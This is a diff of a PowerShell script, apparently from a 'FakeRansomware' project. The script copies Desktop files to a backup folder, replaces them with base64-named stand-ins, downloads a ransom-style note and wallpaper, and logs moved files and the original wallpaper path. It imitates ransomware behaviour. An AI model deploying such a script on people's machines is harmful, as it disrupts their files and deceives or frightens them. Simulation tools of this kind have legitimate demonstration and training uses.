@@ -3,13 +3,17 @@
 #Prepare system
 
     #Create folders
-    $folder_base =  "$env:ProgramData\andreas6920\"
+    $folder_base =  "$($env:ProgramData)\andreas6920\"
         mkdir $folder_base -ea ignore | Out-Null
     $wallpaper = "$folder_base\Wallpaper.jpg"
     $note = "$folder_base\READ_ME.txt"
+    $movedfiles = "$folder_base\moved_files.txt"
+    $wallpaperlocation = "$folder_base\originalwallpaper_location.txt"
+    (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper > $wallpaperlocation
 
     Invoke-WebRequest "https://github.com/Andreas6920/FakeRansomware/raw/main/resources/Background.jpg" -o $wallpaper
     Invoke-WebRequest "https://github.com/Andreas6920/FakeRansomware/raw/main/resources/note.txt" -o $note
+
 
 #File encryption
     $targetdir = [Environment]::GetFolderPath("Desktop")
@@ -23,7 +27,7 @@ Robocopy $targetdir $backupdir /E /XF *.* | out-null
 
 foreach ($file in $files)
 {
-#Ignore files bigger than 1GB
+#Ignore files bigger than 1GB, to speed things up
 if(Get-ChildItem $file  | Where-Object {$_.Length -lt 1gb}){
 
 #Copying file from targetdir to backupdir
@@ -36,7 +40,8 @@ $encrypted = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($file))
 $encryptedcontent = $encrypted
 $encrypted = $encrypted.Substring($encrypted.Length - 16).replace("=","")
 $encrypted = $encrypted + ".$fileextension"
-$path = Join-path -path (Split-Path $file) -ChildPath $encrypted
+$path = Join-path -path (Split-Path $file) -ChildPath $encrypted;
+$path >> $movedfiles
 new-item $path | out-null
 Add-Content -Path $path -Value $encryptedcontent
 
